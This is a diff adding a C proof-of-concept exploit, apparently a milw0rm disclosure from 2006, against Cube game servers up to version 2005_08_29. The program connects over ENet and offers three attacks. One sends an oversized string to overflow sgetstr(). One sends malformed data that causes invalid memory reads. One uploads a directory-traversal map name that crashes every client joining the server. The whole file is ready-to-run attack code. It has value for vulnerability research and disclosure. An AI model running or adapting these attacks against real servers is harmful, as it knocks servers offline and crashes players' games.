@@ -1,0 +1,256 @@
+/*
+
+by Luigi Auriemma
+
+You NEED Enet for compiling this tool (then remember -lenet)
+  http://enet.bespin.org / http://enet.cubik.org
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <enet/enet.h>
+
+
+
+#define VER         "0.1"
+#define PORT        28765
+#define MAXTRANS    5000
+#define BOFSZ       (MAXTRANS + 2400)
+#define MAPSUX      "base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../readme.txt"
+
+
+
+// when encoding is activated (all the pre-compiled client/server) the valid
+// tag types are 0, 9, 11, 18, 19, 20, 23, 24, 26, 31 instead of the following
+// values
+
+enum {
+    SV_INITS2C, SV_INITC2S, SV_POS, SV_TEXT, SV_SOUND, SV_CDIS,
+    SV_DIED, SV_DAMAGE, SV_SHOT, SV_FRAGS,
+    SV_TIMEUP, SV_EDITENT, SV_MAPRELOAD, SV_ITEMACC,
+    SV_MAPCHANGE, SV_ITEMSPAWN, SV_ITEMPICKUP, SV_DENIED,
+    SV_PING, SV_PONG, SV_CLIENTPING, SV_GAMEMODE,
+    SV_EDITH, SV_EDITT, SV_EDITS, SV_EDITD, SV_EDITE,
+    SV_SENDMAP, SV_RECVMAP, SV_SERVMSG, SV_ITEMLIST,
+    SV_EXT,
+}; 
+
+void putint(u_char *p, int n, u_char **out) {
+    if(n<128 && n>-127) { *p++ = n; }
+    else if(n<0x8000 && n>=-0x8000) { *p++ = 0x80; *p++ = n; *p++ = n>>8;  }
+    else { *p++ = 0x81; *p++ = n; *p++ = n>>8; *p++ = n>>16; *p++ = n>>24; };
+    *out = p;
+};
+
+int getint(u_char *p, u_char **out) {
+    int c = *((char *)p);
+    p++;
+    if(c==-128) { int n = *p++; n |= *((char *)p)<<8; p++; *out = p; return n;}
+    else if(c==-127) { int n = *p++; n |= *p++<<8; n |= *p++<<16; *out = p; return n|(*p++<<24); } 
+    else { *out = p; return c; }
+};
+
+void sendstring(char *t, u_char *p, u_char **out) {
+    while(*t) putint(p, *t++, &p);
+    putint(p, 0, &p);
+    *out = p;
+};
+
+
+
+enet_uint32 myinetaddr(u_char *ip);
+void cubeenc(u_char *data, int size);
+char *myineta(u_int ip);
+
+
+
+int main(int argc, char *argv[]) {
+    ENetAddress address;
+    ENetEvent   event;
+    ENetPeer    *peer;
+    ENetHost    *client;
+    ENetPacket  *packet;
+    int         enc = 0,
+                len,
+                attack;
+    u_short     port = PORT;
+    u_char      buff[8192],
+                mybof[BOFSZ],
+                *p;
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Cube <= 2005_08_29 multiple vulnerabilities "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 3) {
+        printf("\n"
+            "Usage: %s <attack> <host> [port(%hu)]\n"
+            "\n"
+            "Attack:\n"
+            "1 = sgetstr() buffer-overflow\n"
+            "2 = invalid memory access during data reading (getint and sgetstr)\n"
+            "3 = crash of any client which will join the server through malformed map\n"
+            "    loaded with directory traversal vulnerability and 260 bytes limit\n"
+            "\n",
+            argv[0], port);
+        exit(1);
+    }
+
+    attack = atoi(argv[1]);
+
+    if(enet_initialize()) {
+        printf("\nError: an error occurred while initializing ENet\n");
+        exit(1);
+    }
+
+    client = enet_host_create(
+        NULL        /* create a client host */,
+        1           /* only allow 1 outgoing connection */,
+        57600 / 8   /* 56K modem with 56 Kbps downstream bandwidth */,
+        14400 / 8   /* 56K modem with 14 Kbps upstream bandwidth */);
+
+    if(!client) {
+        printf("An error occurred while trying to create an ENet client host.\n");
+        exit(1);
+    }
+
+    if(argc > 3) port = atoi(argv[3]);
+    if(enet_address_set_host(&address, argv[2]) < 0) {
+        address.host = myinetaddr(argv[2]);
+    }
+    address.port = port;
+
+    printf("- target   %s : %hu\n",
+        myineta(address.host),
+        address.port);
+
+    peer = enet_host_connect(client, &address, 2);    
+    if(!peer) {
+       printf("\nError: no peers available for initiating an ENet connection\n");
+       exit(1);
+    }
+
+    printf("- connect...");
+    if((enet_host_service(client, &event, 5000) > 0) && (event.type == ENET_EVENT_TYPE_CONNECT)) {
+        printf("ok\n");
+    } else {
+        printf("failed!\n");
+        goto quit;
+    }
+
+    if((enet_host_service(client, &event, 3000) > 0) && (event.type == ENET_EVENT_TYPE_RECEIVE)) {
+        if(event.packet->data[2] > SV_EXT) enc = 1;
+        enet_packet_destroy(event.packet);
+    }
+
+    p = buff + 2;
+
+    if(attack == 1) {
+        printf("- send buffer-overflow data (%d bytes)\n", BOFSZ);
+        putint(p, enc ? 9 : SV_TEXT, &p);
+        memset(mybof, 'A', sizeof(mybof) - 1);
+        mybof[sizeof(mybof) - 1] = 0;
+        sendstring(mybof, p, &p);
+
+    } else if(attack == 2) {
+        printf("- send incomplete data (the server will do a reading loop in SV_EXT)\n");
+        putint(p, enc ? 31 : SV_EXT, &p);
+        putint(p, -1, &p);
+        // for(int n = getint(p); n; n--) getint(p);
+
+    } else if(attack == 3) {
+        printf("- send bad map\n");
+        putint(p, enc ? 9 : SV_MAPCHANGE, &p);
+        sendstring(MAPSUX, p, &p);
+        putint(p, 0, &p);
+    }
+
+    len = p - buff;
+    *(u_short *)buff = htons(len);
+
+    if(enc) {
+        printf("- Cube xor encoding activated\n");
+        cubeenc(buff + 2, len - 2);
+    }
+
+    packet = enet_packet_create(
+        buff, 
+        len, 
+        ENET_PACKET_FLAG_RELIABLE);
+
+    enet_peer_send(peer, 0, packet);
+    enet_host_flush(client);
+    if((enet_host_service(client, &event, 3000) > 0) &&(event.type == ENET_EVENT_TYPE_RECEIVE)) {
+        enet_packet_destroy(event.packet);
+    }
+
+    enet_peer_disconnect(peer);
+
+    if(attack == 3) {
+        printf(
+            "- if the server was empty the map has been accepted\n"
+            "  any client which will join the server will exit immediately\n");
+        goto quit;
+    }
+
+    printf("- check server:\n");
+    if(enet_host_service(client, &event, 5000) > 0) {
+        printf("\n  Server does not seem vulnerable\n\n");
+    } else {
+        printf("\n  Server IS vulnerable!!!\n\n");
+    }
+
+    enet_peer_disconnect(peer);
+
+quit:
+    enet_peer_reset(peer);
+    enet_deinitialize();
+    return(0);
+}
+
+
+
+void cubeenc(u_char *data, int size) {
+    u_char  *end;
+
+    for(end = data + size; data != end; data++) {
+        *data ^= 'a';
+    }
+}
+
+
+
+enet_uint32 myinetaddr(u_char *ip) {
+    unsigned    ip1,
+                ip2,
+                ip3,
+                ip4;
+
+    sscanf(ip, "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);
+    return(ENET_HOST_TO_NET_32((ip1 << 24) | (ip2 << 16) | (ip3 << 8) | ip4));
+}
+
+
+
+char *myineta(u_int ip) {
+    static  char    ipc[16];
+
+    ip = ntohl(ip);
+    sprintf(
+        ipc,
+        "%hhu.%hhu.%hhu.%hhu",
+        (ip >> 24) & 0xff,
+        (ip >> 16) & 0xff,
+        (ip >> 8)  & 0xff,
+        (ip  & 0xff));
+    return(ipc);
+}
+
+// milw0rm.com [2006-03-06]
